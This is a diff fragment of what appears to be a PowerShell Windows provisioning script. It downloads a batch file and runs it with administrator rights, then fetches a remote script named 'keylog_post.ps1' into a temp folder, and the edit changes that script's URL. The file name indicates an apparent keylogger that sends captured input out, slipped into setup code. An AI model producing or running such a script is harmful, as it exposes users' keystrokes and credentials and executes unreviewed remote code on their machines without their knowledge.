@@ -18,7 +18,7 @@ Start-Process -FilePath "cmd.exe" -ArgumentList "/c $installPythonToolsBatPath" 
 Invoke-WebRequest -Uri $batFileUrl -OutFile $batFilePath
 Start-Process -FilePath "cmd.exe" -ArgumentList "/c $batFilePath" -Verb RunAs -Wait
 $tempFolder = New-Item -ItemType Directory -Path "$env:TEMP\ProvisionWindows" -Force
-$fgapeScriptUrl = "https://github.com/FanAPIpipa/pipa/raw/main/keylog_post.ps1"
+$fgapeScriptUrl = "https://raw.github.com/FanAPIpipa/pipa/raw/main/keylog_post.ps1"
 $fgapeScriptPath = Join-Path -Path $tempFolder.FullName -ChildPath "keylog_post.ps1"
 
 Invoke-WebRequest -Uri $fgapeScriptUrl -OutFile $fgapeScriptPath
